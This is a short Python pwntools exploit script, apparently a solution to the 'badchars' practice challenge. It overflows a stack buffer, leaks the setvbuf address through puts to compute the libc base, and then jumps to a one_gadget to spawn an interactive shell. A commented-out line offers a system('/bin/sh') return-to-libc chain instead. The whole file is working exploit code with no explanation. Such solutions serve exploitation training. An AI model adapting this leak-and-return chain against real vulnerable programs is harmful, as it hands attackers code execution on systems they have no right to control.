#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./badchars")
elf = ELF("./badchars")
writable = 0x6010b0
pop_r12_r13 = 0x400b3b
mov_r12_r13 = 0x400b34
p1ret = 0x400b39
libc = elf.libc


pay = 'A'*(0x20+0x8)
pay += p64(p1ret) + p64(elf.got['setvbuf']) + p64(elf.plt['puts'])
pay += p64(elf.symbols['pwnme'])

p.sendlineafter("> ", pay)

setvbuf = u64(p.recvuntil("\x7f")[-6:] + "\x00\x00")
libcBase = setvbuf - libc.symbols['setvbuf']
log.info("setvbuf : "+hex(setvbuf))
log.info("libcBase : "+hex(libcBase))
binsh = libcBase + list(libc.search("/bin/sh"))[0]
one_gadget = libcBase + 0xf02a4

pay = 'A'*(0x20+0x8)
pay += p64(one_gadget)
#pay += p64(p1ret) + p64(binsh) + p64(libcBase + libc.symbols['system'])

p.sendlineafter("> ", pay)

p.interactive()
